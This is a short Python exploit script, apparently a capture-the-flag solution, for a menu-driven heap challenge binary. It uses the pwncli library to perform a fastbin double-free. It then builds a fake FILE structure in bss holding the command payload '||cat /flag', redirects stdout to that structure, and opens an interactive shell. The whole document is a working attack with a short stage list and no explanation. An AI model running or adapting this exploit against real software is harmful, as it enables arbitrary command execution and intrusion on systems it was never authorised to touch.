#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

target_addr = 0x60203d

def add(idx, data="\x00"):
    p.sendlineafter("Choice:", "1")
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Content:", data)


def change(idx, data="\x00\n"):
    p.sendlineafter("Choice:", "2")
    p.sendlineafter("Index:", str(idx))
    p.sendlineafter("Content:", data)


def release(idx):
    p.sendlineafter("Choice:", "3")
    p.sendlineafter("Index:", str(idx))


"""
1. fastbin attack to stderr
2. change ptr to bss addr
3. change stdout to bss addr
4. printf -> vfprintf(stdout,...) to get shell 
"""
add(0)
add(1)
release(0)
release(1)
release(0)

add(2, p64(target_addr))
add(3)
add(4)
add(5, flat(["a"*0x13, 0x602090, 0x602090+0x68, 0x602090+0x68+0x68, 0x602020, 0, 0]))

IO_FILE_plus_struct.show_struct()

change(0, flat({0:p16(0x8001)+b"||cat /flag"}))
change(1, flat({0x20:0x602090}))
change(2, flat({8: 0x601f78}))

change(3, p64(0x602090))

p.sendline("1")

p.interactive()